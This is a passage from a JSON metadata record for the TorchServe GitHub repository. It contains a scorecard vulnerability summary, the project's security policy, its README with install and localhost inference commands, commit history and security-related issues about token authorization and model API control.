                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-8qw9-gf7w-42x5",
                        "Warn: Project is vulnerable to: GHSA-rxff-vr5r-8cj5",
                        "Warn: Project is vulnerable to: GHSA-8cp5-3rf8-8gfh / PYSEC-2024-109",
                        "Warn: Project is vulnerable to: GHSA-37q5-v5qm-c9v8",
                        "Warn: Project is vulnerable to: GHSA-3863-2447-669p",
                        "Warn: Project is vulnerable to: GHSA-v68g-wm8c-6x7j",
                        "Warn: Project is vulnerable to: GHSA-5pcm-hx3q-hm94",
                        "Warn: Project is vulnerable to: GHSA-pg7h-5qx3-wjr3"
                    ],
                    "score": 2,
                    "reason": "8 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/pytorch/serve/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\n| Version | Supported          |\n|---------| ------------------ |\n| 0.11.1   | :white_check_mark: |\n\n\n## How we do security\n\n\nAs much as possible, TorchServe relies on automated tools to do security scanning. In particular, we support:\n\n1. Dependency Analysis: Using Dependabot\n2. Docker Scanning: Using Snyk\n3. Code Analysis: Using CodeQL\n\n## Important Security Guidelines\n\n1. TorchServe listens on the following ports\n    1. HTTP - `8080`, `8081`, `8082`\n    2. gRPC - `7070`, `7071`\n\n    These ports are accessible to `localhost` by default.  The addresses can be configured by following the guides for\n    [HTTP](https://github.com/pytorch/serve/blob/master/docs/configuration.md#configure-torchserve-listening-address-and-port) and\n    [gRPC](https://github.com/pytorch/serve/blob/master/docs/configuration.md#configure-torchserve-grpc-listening-addresses-and-ports).\n    TorchServe does not prevent users from configuring the address to be of any value, including the wildcard address `0.0.0.0`.\n    Please be aware of the security risks of configuring the address to be `0.0.0.0`, this will give all addresses(including publicly accessible addresses, if any)\n    on the host, access to the TorchServe endpoints listening on the ports shown above.\n2. By [default](https://github.com/pytorch/serve/blob/master/docker/Dockerfile), TorchServe's Docker image is configured to expose the ports `8080`, `8081`, `8082`, `7070`, `7071` to the host. When starting the container,\n   map the ports exposed by the container to `localhost` ports or a specific IP address, as shown in this [security guideline](https://github.com/pytorch/serve/blob/master/docker/README.md#security-guideline).\n\n3. Be sure to validate the authenticity of the `.mar` file being used with TorchServe.\n    1. A `.mar` file being downloaded from the internet from an untrustworthy source may have malicious code, compromising the integrity of your application.\n    2. TorchServe executes the arbitrary python code packaged in the `mar` file. Make sure that you've either audited that the code you're using is safe and/or is from a source that you trust.\n    3. TorchServe supports custom [plugins](https://github.com/pytorch/serve/tree/master/plugins) and [handlers](https://github.com/pytorch/serve/blob/master/docs/custom_service.md).\n       These can be utilized to extend TorchServe functionality to perform runtime security scanning using tools such as:\n        - Clamd: https://pypi.org/project/clamd/\n        - VirusTotal: https://virustotal.github.io/vt-py/\n        - Fickling: https://github.com/trailofbits/fickling\n    4. Running TorchServe inside a container environment and loading an untrusted `.mar` file does not guarantee isolation from a security perspective.\n4. By default, TorchServe allows you to register models from all URLs. Make sure to set `allowed_urls` parameter in config.properties to restrict this. You can find more details in the [configuration guide](https://pytorch.org/serve/configuration.html#other-properties).\n    - `use_env_allowed_urls=true` is required in config.properties to read `allowed_urls` from environment variable.\n5. Enable SSL:\n\n    TorchServe supports two ways to configure SSL:\n    1. Using a keystore\n    2. Using private-key/certificate files\n\n    You can find more details in the [configuration guide](https://pytorch.org/serve/configuration.html#enable-ssl).\n6. Prepare your model against bad inputs and prompt injections. Some recommendations:\n    1. Pre-analysis: check how the model performs by default when exposed to prompt injection (e.g. using [fuzzing for prompt injection](https://github.com/FonduAI/awesome-prompt-injection?tab=readme-ov-file#tools)).\n    2. Input Sanitation: Before feeding data to the model, sanitize inputs rigorously. This involves techniques such as:\n        - Validation: Enforce strict rules on allowed characters and data types.\n        - Filtering: Remove potentially malicious scripts or code fragments.\n        - Encoding: Convert special characters into safe representations.\n        - Verification: Run tooling that identifies potential script injections (e.g. [models that detect prompt injection attempts](https://python.langchain.com/docs/guides/safety/hugging_face_prompt_injection)).\n7. If you intend to run multiple models in parallel with shared memory, it is your responsibility to ensure the models do not interact or access each other's data. The primary areas of concern are tenant isolation, resource allocation, model sharing and hardware attacks.\n8. TorchServe enforces token authorization by default: check [documentation](https://github.com/pytorch/serve/blob/master/docs/token_authorization_api.md) for more information.\n9. By default, TorchServe prevents you from registering and deleting models after startup. Check out Model API control [documentation](./docs/model_api_control.md) for more information.\n\n## Reporting a Vulnerability\n\nIf you find a vulnerability please report it to https://www.facebook.com/whitehat and aws-security@amazon.com\n",
        "project_all_labels": [
            "aws",
            "benchmark",
            "bootcamp",
            "bug",
            "c++",
            "checkpoint_restart_API",
            "ci",
            "close_after_merge",
            "code-quality",
            "cpu",
            "debugging",
            "dependencies",
            "deprecation",
            "docker",
            "documentation",
            "duplicate",
            "easy",
            "enhancement",
            "example",
            "future",
            "github_actions",
            "good first issue",
            "gpu",
            "grpc",
            "hackability",
            "hackathon",
            "help wanted",
            "incorrect_error_msg",
            "intel",
            "internal",
            "invalid",
            "java",
            "kfserving",
            "kokoro:force-run",
            "kokoro:run",
            "kubernetes",
            "language",
            "large-model",
            "launch blocker",
            "llm",
            "m1",
            "mac",
            "metrics",
            "needs-reproduction",
            "OIP",
            "onnx",
            "optimization",
            "p0",
            "p1",
            "p2",
            "perf",
            "preprocessing",
            "prototype",
            "pytest",
            "python",
            "question",
            "sagemaker",
            "security",
            "staged_release",
            "support",
            "torch.compile",
            "triaged",
            "triaged_wait",
            "urgent",
            "usability",
            "Why_should_I_use_serve",
            "windows",
            "wontfix",
            "workflowx"
        ],
        "README_content": "# ❗ANNOUNCEMENT: Security Changes❗\nTorchServe now enforces token authorization enabled and model API control disabled by default. These security features are intended to address the concern of unauthorized API calls and to prevent potential malicious code from being introduced to the model server. Refer the following documentation for more information: [Token Authorization](https://github.com/pytorch/serve/blob/master/docs/token_authorization_api.md), [Model API control](https://github.com/pytorch/serve/blob/master/docs/model_api_control.md)\n\n# TorchServe\n\n\n![Nightly build](https://github.com/pytorch/serve/actions/workflows/torchserve-nightly-build.yml/badge.svg)\n![Docker Nightly build](https://github.com/pytorch/serve/actions/workflows/docker-nightly-build.yml/badge.svg)\n![Benchmark Nightly](https://github.com/pytorch/serve/actions/workflows/benchmark_nightly.yml/badge.svg)\n![Docker Regression Nightly](https://github.com/pytorch/serve/actions/workflows/regression_tests_docker.yml/badge.svg)\n![KServe Regression Nightly](https://github.com/pytorch/serve/actions/workflows/kserve_cpu_tests.yml/badge.svg)\n![Kubernetes Regression Nightly](https://github.com/pytorch/serve/actions/workflows/kubernetes_tests.yml/badge.svg)\n\nTorchServe is a flexible and easy-to-use tool for serving and scaling PyTorch models in production.\n\nRequires python >= 3.8\n\n```bash\ncurl http://127.0.0.1:8080/predictions/bert -T input.txt\n```\n### 🚀 Quick start with TorchServe\n\n```bash\n# Install dependencies\n# cuda is optional\npython ./ts_scripts/install_dependencies.py --cuda=cu121\n\n# Latest release\npip install torchserve torch-model-archiver torch-workflow-archiver\n\n# Nightly build\npip install torchserve-nightly torch-model-archiver-nightly torch-workflow-archiver-nightly\n```\n\n### 🚀 Quick start with TorchServe (conda)\n\n```bash\n# Install dependencies\n# cuda is optional\npython ./ts_scripts/install_dependencies.py --cuda=cu121\n\n# Latest release\nconda install -c pytorch torchserve torch-model-archiver torch-workflow-archiver\n\n# Nightly build\nconda install -c pytorch-nightly torchserve torch-model-archiver torch-workflow-archiver\n```\n\n[Getting started guide](docs/getting_started.md)\n\n### 🐳 Quick Start with Docker\n\n```bash\n# Latest release\ndocker pull pytorch/torchserve\n\n# Nightly build\ndocker pull pytorch/torchserve-nightly\n```\n\nRefer to [torchserve docker](docker/README.md) for details.\n\n### 🤖 Quick Start LLM Deployment\n\n#### VLLM Engine\n```bash\n# Make sure to install torchserve with pip or conda as described above and login with `huggingface-cli login`\npython -m ts.llm_launcher --model_id meta-llama/Llama-3.2-3B-Instruct --disable_token_auth\n\n# Try it out\ncurl -X POST -d '{\"model\":\"meta-llama/Llama-3.2-3B-Instruct\", \"prompt\":\"Hello, my name is\", \"max_tokens\": 200}' --header \"Content-Type: application/json\" \"http://localhost:8080/predictions/model/1.0/v1/completions\"\n```\n\n#### TRT-LLM Engine\n```bash\n# Make sure to install torchserve with python venv as described above and login with `huggingface-cli login`\n# pip install -U --use-deprecated=legacy-resolver -r requirements/trt_llm.txt\npython -m ts.llm_launcher --model_id meta-llama/Meta-Llama-3.1-8B-Instruct --engine trt_llm --disable_token_auth\n\n# Try it out\ncurl -X POST -d '{\"prompt\":\"count from 1 to 9 in french \", \"max_tokens\": 100}' --header \"Content-Type: application/json\" \"http://localhost:8080/predictions/model\"\n```\n\n### 🚢 Quick Start LLM Deployment with Docker\n\n```bash\n#export token=<HUGGINGFACE_HUB_TOKEN>\ndocker build --pull . -f docker/Dockerfile.vllm -t ts/vllm\n\ndocker run --rm -ti --shm-size 10g --gpus all -e HUGGING_FACE_HUB_TOKEN=$token -p 8080:8080 -v data:/data ts/vllm --model_id meta-llama/Meta-Llama-3-8B-Instruct --disable_token_auth\n\n# Try it out\ncurl -X POST -d '{\"model\":\"meta-llama/Meta-Llama-3-8B-Instruct\", \"prompt\":\"Hello, my name is\", \"max_tokens\": 200}' --header \"Content-Type: application/json\" \"http://localhost:8080/predictions/model/1.0/v1/completions\"\n```\n\nRefer to [LLM deployment](docs/llm_deployment.md) for details and other methods.\n\n## ⚡ Why TorchServe\n* Write once, run anywhere, on-prem, on-cloud, supports inference on CPUs, GPUs, AWS Inf1/Inf2/Trn1, Google Cloud TPUs, [Nvidia MPS](docs/nvidia_mps.md)\n* [Model Management API](docs/management_api.md): multi model management with optimized worker to model allocation\n* [Inference API](docs/inference_api.md): REST and gRPC support for batched inference\n* [TorchServe Workflows](examples/Workflows/README.md): deploy complex DAGs with multiple interdependent models\n* Default way to serve PyTorch models in\n  * [Sagemaker](https://aws.amazon.com/blogs/machine-learning/serving-pytorch-models-in-production-with-the-amazon-sagemaker-native-torchserve-integration/)\n  * [Vertex AI](https://cloud.google.com/blog/topics/developers-practitioners/pytorch-google-cloud-how-deploy-pytorch-models-vertex-ai)\n  * [Kubernetes](kubernetes) with support for [autoscaling](kubernetes#session-affinity-with-multiple-torchserve-pods), session-affinity, monitoring using Grafana works on-prem, AWS EKS, Google GKE, Azure AKS\n  * [Kserve](https://kserve.github.io/website/0.8/modelserving/v1beta1/torchserve/): Supports both v1 and v2 API, [autoscaling and canary deployments](kubernetes/kserve/README.md#autoscaling) for A/B testing\n  * [Kubeflow](https://v0-5.kubeflow.org/docs/components/pytorchserving/)\n  * [MLflow](https://github.com/mlflow/mlflow-torchserve)\n* Export your model for optimized inference. Torchscript out of the box, [PyTorch Compiler](examples/pt2/README.md) preview, [ORT and ONNX](https://github.com/pytorch/serve/blob/master/docs/performance_guide.md), [IPEX](https://github.com/pytorch/serve/tree/master/examples/intel_extension_for_pytorch), [TensorRT](https://github.com/pytorch/serve/blob/master/docs/performance_guide.md), [FasterTransformer](https://github.com/pytorch/serve/tree/master/examples/FasterTransformer_HuggingFace_Bert), FlashAttention (Better Transformers)\n* [Performance Guide](docs/performance_guide.md): builtin support to optimize, benchmark, and profile PyTorch and TorchServe performance\n* [Expressive handlers](CONTRIBUTING.md): An expressive handler architecture that makes it trivial to support inferencing for your use case with [many supported out of the box](https://github.com/pytorch/serve/tree/master/ts/torch_handler)\n* [Metrics API](docs/metrics.md): out-of-the-box support for system-level metrics with [Prometheus exports](https://github.com/pytorch/serve/tree/master/examples/custom_metrics), custom metrics,\n* [Large Model Inference Guide](docs/large_model_inference.md): With support for GenAI, LLMs including\n  * [SOTA GenAI performance](https://github.com/pytorch/serve/tree/master/examples/pt2#torchcompile-genai-examples) using `torch.compile`\n  * Fast Kernels with FlashAttention v2, continuous batching and streaming response\n  * PyTorch [Tensor Parallel](examples/large_models/tp_llama) preview, [Pipeline Parallel](examples/large_models/Huggingface_pippy)\n  * Microsoft [DeepSpeed](examples/large_models/deepspeed), [DeepSpeed-Mii](examples/large_models/deepspeed_mii)\n  * Hugging Face [Accelerate](examples/large_models/Huggingface_accelerate), [Diffusers](examples/diffusers)\n  * Running large models on AWS [Sagemaker](https://docs.aws.amazon.com/sagemaker/latest/dg/large-model-inference-tutorials-torchserve.html) and [Inferentia2](https://pytorch.org/blog/high-performance-llama/)\n  * Running [Meta Llama Chatbot locally on Mac](examples/LLM/llama)\n* Monitoring using Grafana and [Datadog](https://www.datadoghq.com/blog/ai-integrations/#model-serving-and-deployment-vertex-ai-amazon-sagemaker-torchserve)\n\n\n## 🤔 How does TorchServe work\n* [Model Server for PyTorch Documentation](docs/README.md): Full documentation\n* [TorchServe internals](docs/internals.md): How TorchServe was built\n* [Contributing guide](CONTRIBUTING.md): How to contribute to TorchServe\n\n\n## 🏆 Highlighted Examples\n* [Serving Meta Llama with TorchServe](examples/LLM/llama/README.md)\n* [Chatbot with Meta Llama on Mac 🦙💬](examples/LLM/llama/chat_app)\n* [🤗 HuggingFace Transformers](examples/Huggingface_Transformers) with a [Better Transformer Integration/ Flash Attention & Xformer Memory Efficient ](examples/Huggingface_Transformers#Speed-up-inference-with-Better-Transformer)\n* [Stable Diffusion](examples/diffusers)\n* [Model parallel inference](examples/Huggingface_Transformers#model-parallelism)\n* [MultiModal models with MMF](https://github.com/pytorch/serve/tree/master/examples/MMF-activity-recognition) combining text, audio and video\n* [Dual Neural Machine Translation](examples/Workflows/nmt_transformers_pipeline) for a complex workflow DAG\n* [TorchServe Integrations](examples/README.md#torchserve-integrations)\n* [TorchServe Internals](examples/README.md#torchserve-internals)\n* [TorchServe UseCases](examples/README.md#usecases)\n\nFor [more examples](examples/README.md)\n\n## 🛡️ TorchServe Security Policy\n[SECURITY.md](SECURITY.md)\n\n## 🤓 Learn More\nhttps://pytorch.org/serve\n\n\n## 🫂 Contributing\n\nWe welcome all contributions!\n\nTo learn more about how to contribute, see the contributor guide [here](https://github.com/pytorch/serve/blob/master/CONTRIBUTING.md).\n\n## 📰 News\n* [High performance Llama 2 deployments with AWS Inferentia2 using TorchServe](https://pytorch.org/blog/high-performance-llama/)\n* [Naver Case Study: Transition From High-Cost GPUs to Intel CPUs and oneAPI powered Software with performance](https://pytorch.org/blog/ml-model-server-resource-saving/)\n* [Run multiple generative AI models on GPU using Amazon SageMaker multi-model endpoints with TorchServe and save up to 75% in inference costs](https://pytorch.org/blog/amazon-sagemaker-w-torchserve/)\n* [Deploying your Generative AI model in only four steps with Vertex AI and PyTorch](https://cloud.google.com/blog/products/ai-machine-learning/get-your-genai-model-going-in-four-easy-steps)\n* [PyTorch Model Serving on Google Cloud TPU v5](https://cloud.google.com/tpu/docs/v5e-inference#pytorch-model-inference-and-serving)\n* [Monitoring using Datadog](https://www.datadoghq.com/blog/ai-integrations/#model-serving-and-deployment-vertex-ai-amazon-sagemaker-torchserve)\n* [Torchserve Performance Tuning, Animated Drawings Case-Study](https://pytorch.org/blog/torchserve-performance-tuning/)\n* [Walmart Search: Serving Models at a Scale on TorchServe](https://medium.com/walmartglobaltech/search-model-serving-using-pytorch-and-torchserve-6caf9d1c5f4d)\n* [🎥 Scaling inference on CPU with TorchServe](https://www.youtube.com/watch?v=066_Jd6cwZg)\n* [🎥 TorchServe C++ backend](https://www.youtube.com/watch?v=OSmGGDpaesc)\n* [Grokking Intel CPU PyTorch performance from first principles: a TorchServe case study](https://pytorch.org/tutorials/intermediate/torchserve_with_ipex.html)\n* [Grokking Intel CPU PyTorch performance from first principles( Part 2): a TorchServe case study](https://pytorch.org/tutorials/intermediate/torchserve_with_ipex_2.html)\n* [Case Study: Amazon Ads Uses PyTorch and AWS Inferentia to Scale Models for Ads Processing](https://pytorch.org/blog/amazon-ads-case-study/)\n* [Optimize your inference jobs using dynamic batch inference with TorchServe on Amazon SageMaker](https://aws.amazon.com/blogs/machine-learning/optimize-your-inference-jobs-using-dynamic-batch-inference-with-torchserve-on-amazon-sagemaker/)\n* [Using AI to bring children's drawings to life](https://ai.meta.com/blog/using-ai-to-bring-childrens-drawings-to-life/)\n* [🎥 Model Serving in PyTorch](https://www.youtube.com/watch?v=2A17ZtycsPw)\n* [Evolution of Cresta's machine learning architecture: Migration to AWS and PyTorch](https://aws.amazon.com/blogs/machine-learning/evolution-of-crestas-machine-learning-architecture-migration-to-aws-and-pytorch/)\n* [🎥 Explain Like I’m 5: TorchServe](https://www.youtube.com/watch?v=NEdZbkfHQCk)\n* [🎥 How to Serve PyTorch Models with TorchServe](https://www.youtube.com/watch?v=XlO7iQMV3Ik)\n* [How to deploy PyTorch models on Vertex AI](https://cloud.google.com/blog/topics/developers-practitioners/pytorch-google-cloud-how-deploy-pytorch-models-vertex-ai)\n* [Quantitative Comparison of Serving Platforms](https://biano-ai.github.io/research/2021/08/16/quantitative-comparison-of-serving-platforms-for-neural-networks.html)\n* [Efficient Serverless deployment of PyTorch models on Azure](https://medium.com/pytorch/efficient-serverless-deployment-of-pytorch-models-on-azure-dc9c2b6bfee7)\n* [Deploy PyTorch models with TorchServe in Azure Machine Learning online endpoints](https://techcommunity.microsoft.com/t5/ai-machine-learning-blog/deploy-pytorch-models-with-torchserve-in-azure-machine-learning/ba-p/2466459)\n* [Dynaboard moving beyond accuracy to holistic model evaluation in NLP](https://ai.facebook.com/blog/dynaboard-moving-beyond-accuracy-to-holistic-model-evaluation-in-nlp/)\n* [A MLOps Tale about operationalising MLFlow and PyTorch](https://medium.com/mlops-community/engineering-lab-1-team-1-a-mlops-tale-about-operationalising-mlflow-and-pytorch-62193b55dc19)\n* [Operationalize, Scale and Infuse Trust in AI Models using KFServing](https://blog.kubeflow.org/release/official/2021/03/08/kfserving-0.5.html)\n* [How Wadhwani AI Uses PyTorch To Empower Cotton Farmers](https://medium.com/pytorch/how-wadhwani-ai-uses-pytorch-to-empower-cotton-farmers-14397f4c9f2b)\n* [TorchServe Streamlit Integration](https://cceyda.github.io/blog/huggingface/torchserve/streamlit/ner/2020/10/09/huggingface_streamlit_serve.html)\n* [Dynabench aims to make AI models more robust through distributed human workers](https://venturebeat.com/2020/09/24/facebooks-dynabench-aims-to-make-ai-models-more-robust-through-distributed-human-workers/)\n* [Announcing TorchServe](https://aws.amazon.com/blogs/aws/announcing-torchserve-an-open-source-model-server-for-pytorch/)\n\n## 💖 All Contributors\n\n<a href=\"https://github.com/pytorch/serve/graphs/contributors\">\n  <img src=\"https://contrib.rocks/image?repo=pytorch/serve\" />\n</a>\n\nMade with [contrib.rocks](https://contrib.rocks).\n## ⚖️ Disclaimer\nThis repository is jointly operated and maintained by Amazon, Meta and a number of individual contributors listed in the [CONTRIBUTORS](https://github.com/pytorch/serve/graphs/contributors) file. For questions directed at Meta, please send an email to opensource@fb.com. For questions directed at Amazon, please send an email to torchserve@amazon.com. For all other questions, please open up an issue in this repository [here](https://github.com/pytorch/serve/issues).\n\n*TorchServe acknowledges the [Multi Model Server (MMS)](https://github.com/awslabs/multi-model-server) project from which it was derived*\n",
        "num_commits": 3880,
        "project_age_days": 1854,
        "project_created_at": "2019-10-03",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-23",
        "num_contributors": 177,
        "num_pull": 1710,
        "num_issues": 3347,
        "num_opening_issue": 411,
        "project_size(kB)": 101556,
        "num_stargazers": 4197,
        "num_watchers": 4197,
        "num_forks": 858,
        "num_subscribers": 56,
        "SecurityPolicy_created_at": "2022-04-01 17:25:17",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "fd1c7376b636612d9c5790cfd91d33e060d31da7",
                "url": "https://github.com/pytorch/serve/commit/fd1c7376b636612d9c5790cfd91d33e060d31da7",
                "date": "2024-07-18 18:56:43"
            },
            {
                "commit_id": "60727af50df896f4dd7aba2abe10f2afc2b58979",
                "url": "https://github.com/pytorch/serve/commit/60727af50df896f4dd7aba2abe10f2afc2b58979",
                "date": "2024-05-16 18:14:51"
            },
            {
                "commit_id": "239f91efb597eea6e0ca7cd17166a21222ed4d48",
                "url": "https://github.com/pytorch/serve/commit/239f91efb597eea6e0ca7cd17166a21222ed4d48",
                "date": "2024-05-07 17:29:25"
            },
            {
                "commit_id": "4ec75181a6ba7b7d04e0df3341f5bd9dabbd3197",
                "url": "https://github.com/pytorch/serve/commit/4ec75181a6ba7b7d04e0df3341f5bd9dabbd3197",
                "date": "2024-05-01 00:56:51"
            },
            {
                "commit_id": "9a32216425e6bbcc655aa200856583a064bab586",
                "url": "https://github.com/pytorch/serve/commit/9a32216425e6bbcc655aa200856583a064bab586",
                "date": "2024-04-25 19:59:31"
            },
            {
                "commit_id": "953f25249f3d41c733dd5a211b4846f41748eebb",
                "url": "https://github.com/pytorch/serve/commit/953f25249f3d41c733dd5a211b4846f41748eebb",
                "date": "2024-04-17 17:55:11"
            },
            {
                "commit_id": "1a99de4675eaaad4ddf532e603ae2f175656462a",
                "url": "https://github.com/pytorch/serve/commit/1a99de4675eaaad4ddf532e603ae2f175656462a",
                "date": "2024-03-27 00:49:40"
            },
            {
                "commit_id": "0fc9ee7d31f19c42518128d013619faffc49f1cb",
                "url": "https://github.com/pytorch/serve/commit/0fc9ee7d31f19c42518128d013619faffc49f1cb",
                "date": "2024-03-26 19:01:08"
            },
            {
                "commit_id": "f33be46fd242f219c58808829718dd98cbeb8522",
                "url": "https://github.com/pytorch/serve/commit/f33be46fd242f219c58808829718dd98cbeb8522",
                "date": "2024-03-26 01:08:02"
            },
            {
                "commit_id": "1994aa02cc5eb4e309417812a74e7bf201657d3a",
                "url": "https://github.com/pytorch/serve/commit/1994aa02cc5eb4e309417812a74e7bf201657d3a",
                "date": "2024-03-22 02:52:54"
            },
            {
                "commit_id": "8f5fc8858173db87213af98d6ce90033200e4676",
                "url": "https://github.com/pytorch/serve/commit/8f5fc8858173db87213af98d6ce90033200e4676",
                "date": "2023-11-13 18:39:26"
            },
            {
                "commit_id": "41927495d79ad361d548179cb4c1e2451f346b77",
                "url": "https://github.com/pytorch/serve/commit/41927495d79ad361d548179cb4c1e2451f346b77",
                "date": "2023-11-08 02:21:24"
            },
            {
                "commit_id": "a70955aef59b148529f9c4f71d99e9464ae83835",
                "url": "https://github.com/pytorch/serve/commit/a70955aef59b148529f9c4f71d99e9464ae83835",
                "date": "2023-10-13 04:13:49"
            },
            {
                "commit_id": "6a42b5cc0dc25f934ffbb95752a360c57096c5ed",
                "url": "https://github.com/pytorch/serve/commit/6a42b5cc0dc25f934ffbb95752a360c57096c5ed",
                "date": "2023-10-10 21:02:10"
            },
            {
                "commit_id": "88a19deabdc9c2eabdc587dbed877b12db412f7b",
                "url": "https://github.com/pytorch/serve/commit/88a19deabdc9c2eabdc587dbed877b12db412f7b",
                "date": "2023-10-04 09:38:21"
            },
            {
                "commit_id": "5f36b20c754bef7fdfd9778ed3c5ea5647505213",
                "url": "https://github.com/pytorch/serve/commit/5f36b20c754bef7fdfd9778ed3c5ea5647505213",
                "date": "2023-10-02 16:58:18"
            },
            {
                "commit_id": "92657b2e339fcc19e1554edf30e7f06436327681",
                "url": "https://github.com/pytorch/serve/commit/92657b2e339fcc19e1554edf30e7f06436327681",
                "date": "2023-02-21 17:29:59"
            },
            {
                "commit_id": "81907d70891ec1680d7c41950a46a335fd985aea",
                "url": "https://github.com/pytorch/serve/commit/81907d70891ec1680d7c41950a46a335fd985aea",
                "date": "2022-04-01 17:25:39"
            },
            {
                "commit_id": "36172fc9617264e8627b4408376a65127b0d752b",
                "url": "https://github.com/pytorch/serve/commit/36172fc9617264e8627b4408376a65127b0d752b",
                "date": "2022-04-01 17:25:17"
            }
        ],
        "project_security_labels": [
            "security"
        ],
        "security_issues": [
            {
                "url": "https://github.com/pytorch/serve/issues/3158",
                "title": "Support \"model-control-mode\" in configuration",
                "labels": [
                    "enhancement",
                    "p0",
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 3158,
                "id": 2311717873,
                "state": "closed",
                "project_created_at": "2024-05-23T00:37:13Z",
                "closed_at": "2024-06-11T18:28:31Z",
                "body": "### 🚀 The feature\n\n- Support model-control-mode:\r\n1. none:  Models are loaded at start up and can not be modified. (default).\r\n2. explicit: Models can be loaded and unloaded via the model load APIs.\r\n\r\n- Support model-control-mode is configurable via config.properties \n\n### Motivation, pitch\n\nFor security reason, it is important to prevent malicious code is uploaded in model server.\n\n### Alternatives\n\n_No response_\n\n### Additional context\n\n_No response_",
                "comments": [
                    {
                        "body": "Model API control has been added. Default is model API disabled preventing registering and deleting models once TorchServe starts. ",
                        "user": "udaij12",
                        "issue_author_association": "COLLABORATOR",
                        "project_created_at": "2024-06-11T18:28:31Z",
                        "url": "https://github.com/pytorch/serve/issues/3158#issuecomment-2161370837"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/3157",
                "title": "Enable token authentication as default",
                "labels": [
                    "enhancement",
                    "p0",
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 3157,
                "id": 2311697127,
                "state": "open",
                "project_created_at": "2024-05-23T00:19:41Z",
                "closed_at": null,
                "body": "### 🚀 The feature\n\n- By default, enable plugin token authentication.\r\n- Allow cx to disable token authentication via config.properties.\n\n### Motivation, pitch\n\nCurrent token authentication is enabled via option \"--plugins-path /path/to/the/jar/files\".\n\n### Alternatives\n\n_No response_\n\n### Additional context\n\n_No response_",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/3065",
                "title": "improve security doc for model security check ",
                "labels": [
                    "documentation",
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 3065,
                "id": 2221260097,
                "state": "closed",
                "project_created_at": "2024-04-02T19:14:36Z",
                "closed_at": "2024-04-17T18:25:41Z",
                "body": "### 📚 The doc issue\n\nThe model url provided by cx potentially can contain unsafe content. Existing security lacks the summary of guidance to cx to overcome this issue.\n\n### Suggest a potential alternative/fix\n\nTorchServe provides 3 different levels security check to address this issue. TorchServe Security doc can be updated to provide guidance for cx.\r\n- option1: allowed urls\r\n- option2: cx plugin is a flexible solution which allows cx to add the security check they prefer. \r\n- option3: prod infra (cloud service or internal company infra) provide AOT security check.",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2787",
                "title": "Update Huggingface_Transformers examples for safetensors",
                "labels": [
                    "triaged",
                    "security"
                ],
                "user": "nathanweeks",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2787,
                "id": 1989527525,
                "state": "open",
                "project_created_at": "2023-11-12T19:01:27Z",
                "closed_at": null,
                "body": "### 📚 The doc issue\n\nIn examples/Huggingface_Transformers/README.md, the `torch-model-archiver` commands specify `--serialized-file Transformer_model/pytorch_model.bin` option-arguments. However, the `Download_Transformer_models.py` script in the same directory currently results in a downloaded model in the safetensors format: \r\n\r\n```\r\n$ python Download_Transformer_models.py\r\n...\r\nSave model and tokenizer/ Torchscript model based on the setting from setup_config bert-base-uncased in directory ./Transformer_model\r\n$ ls -1 Transformer_model/\r\nconfig.json\r\nmodel.safetensors\r\nspecial_tokens_map.json\r\ntokenizer_config.json\r\ntokenizer.json\r\nvocab.txt\r\n```\n\n### Suggest a potential alternative/fix\n\nPerhaps update the examples to accommodate both formats.",
                "comments": [
                    {
                        "body": "Makes sense, @HamidShojanazeri @mreso is one of you interested in this?",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-12T23:10:26Z",
                        "url": "https://github.com/pytorch/serve/issues/2787#issuecomment-1807275099"
                    },
                    {
                        "body": "How do you manage to solve this? I still don't know how torch-model-archiver works with safetensors.",
                        "user": "yolk-pie-L",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-03-14T06:44:57Z",
                        "url": "https://github.com/pytorch/serve/issues/2787#issuecomment-1996629669"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2685",
                "title": "push down url validation to avoid security check false alarm",
                "labels": [
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 2685,
                "id": 1929160730,
                "state": "closed",
                "project_created_at": "2023-10-05T22:21:38Z",
                "closed_at": "2023-10-09T22:26:24Z",
                "body": "## Description\r\n\r\nPlease read our [CONTRIBUTING.md](https://github.com/pytorch/serve/blob/master/CONTRIBUTING.md) prior to creating your first pull request.\r\n\r\nPlease include a summary of the feature or issue being fixed. Please also include relevant motivation and context. List any dependencies that are required for this change.\r\n\r\nThe url validation is already done before we use the url. There is false security alarm b/c security check lost the context. To avoid the false alarm, we push down url validation.\r\n\r\nFixing:\r\n1. disable loading TS_ALLOWED_URLS from env\r\n2. move url validation close to \"new URL(url)\" to clearly show security false positive\"\r\n3. sanity check archiveName to guard Uncontrolled data used in path expression\r\n\r\nFixes #(issue)\r\n#2665 \r\n\r\n## Type of change\r\n\r\nPlease delete options that are not relevant.\r\n\r\n- [X] Bug fix (non-breaking change which fixes an issue)\r\n- [ ] Breaking change (fix or feature that would cause existing functionality to not work as expected)\r\n- [ ] New feature (non-breaking change which adds functionality)\r\n- [ ] This change requires a documentation update\r\n\r\n## Feature/Issue validation/testing\r\n\r\nPlease describe the Unit or Integration tests that you ran to verify your changes and relevant result summary. Provide instructions so it can be reproduced.\r\nPlease also list any relevant details for your test configuration.\r\n\r\n- [ ] Test A\r\nLogs for Test A\r\n\r\n- [ ] Test B\r\nLogs for Test B\r\n\r\n\r\n## Checklist:\r\n\r\n- 